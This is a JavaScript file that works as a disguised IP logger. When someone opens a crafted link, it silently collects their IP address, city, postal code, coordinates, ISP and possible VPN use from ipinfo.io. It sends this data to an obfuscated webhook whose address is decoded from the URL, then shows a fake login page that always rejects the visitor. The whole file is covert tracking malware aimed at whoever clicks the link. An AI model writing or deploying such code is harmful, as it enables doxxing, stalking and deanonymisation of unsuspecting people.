let vpnList = {}
let user = (window.location.search.match(/(?<=\?user=).+(?=\?)/) || 'None')
let decrypt = window.location.search.match(/(?<=\?code=).+/)[0].split('-')
let hook = '9 10 2 10 3 9 10 8 1 8 6 8 3 3 3 4 10 8 10 / 25 -16 -2 44 29 45 29 2 -8 -4 -9 22 -13 -4 -19 41 41 29 42 -6 -18 -19 34 39 28 0 -23 39 34 -1 -24 44 -20 0 32 -9 44 28 45 3 -16 -4 33 28 27 1 _ 33 -5 25 30 2 27 -21 43 36 -1 42 -24 -24 2 -22 24 10 -3 -11 -20 -9'
decrypt = [parseInt(decrypt[0]),parseInt(decrypt[1]),parseInt(decrypt[2])]

console.log(decrypt);
console.log(unobfuscate(hook,...decrypt));
fetch('./vpns.json')
.then((response) => response.json())
.then((json) => vpnList = json);

if (user && user != 'hidden') {
  $.getJSON("https://ipinfo.io/json", function(data) {
    console.log(data);
    var params = {
      embeds: [
        {
          "title": "Logged Someone",
          "color": 15258703,
          "thumbnail": {
          },
          "fields": [
            {
              "name": "Timestamp",
              "value": `> ${Date.now()}`
            },
            {
              "name": "Given Code",
              "value": `> ${user}`
            },
            {
              "name": "IP Address",
              "value": `>>> ${data.ip} ${
                (Object.keys(vpnList).includes(data.ip) ? '\n\n🚩 This IP might be a VPN. \nConfidence: '+vpnList[data.ip] : '')
              }`
            },
            {
              "name": "GeoLocation Info",
              "value": `>>> Town, State: ${data.city}, ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTimeZone: ${(data.timezone).replace('_', ' ')}\nLong/Lat: ${data.loc}`
            },
            {
              "name": "Network Info",
              "value": `>>> HostName: ${data.hostname}\nISP: ${data.org}\n`
            }
          ]
        }
      ]
    }
    fetch(unobfuscate(hook,...decrypt), {
      method: "POST",
      headers: {
          'Content-type': 'application/json'
      },
      body: JSON.stringify(params)
    }).then(res => {
      console.log(res);
      setTimeout(
        ()=>{
          document.body.innerHTML = `
          <div>
          <h2>Login</h2>
          Username: <input type="text" value=${user}><br>
          Password: <input type="text"><br>
          <button onclick="alert('Invalid username or password')">Submit</button>
          </div>
          `
        },Math.random()*1000
      )
    })
  })
}
